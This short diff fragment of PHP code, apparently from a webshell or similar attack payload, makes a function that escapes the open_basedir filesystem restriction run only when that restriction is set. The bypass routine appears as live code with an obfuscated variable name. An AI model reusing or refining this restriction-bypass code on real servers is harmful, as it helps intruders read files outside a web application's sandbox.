@@ -18,7 +18,9 @@ function bypass_open_basedir(){
     @ini_set('open_basedir','/');
     @rmdir($_Ei34Ww_sQDfq_FILENAME.'/'.'bypass_open_basedir');
 }
-bypass_open_basedir();
+if(ini_get('open_basedir')!==''){
+    bypass_open_basedir();
+}
 function getSafeStr($str){
     $s1 = iconv('utf-8','gbk//IGNORE',$str);
     $s0 = iconv('gbk','utf-8//IGNORE',$s1);
